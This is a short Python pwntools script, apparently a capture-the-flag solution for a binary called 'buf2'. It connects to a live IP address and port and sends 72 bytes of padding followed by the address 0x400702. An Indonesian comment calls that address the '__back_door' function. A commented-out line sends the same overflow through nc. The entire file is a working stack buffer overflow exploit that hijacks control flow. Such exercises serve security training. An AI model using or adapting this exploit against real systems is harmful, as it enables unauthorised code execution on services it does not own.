#python -c "print 'a'*72+'\x02\x07\x40'" |  nc 18.136.167.108 18031
from pwn import *

r = remote('18.136.167.108',18031)
#r = process('./buf2')
payload = 'a'*72
payload += p64(0x0400702) #alamat fungsi __back_door
r.recvuntil('\n')
r.sendline(payload)
print r.recvall()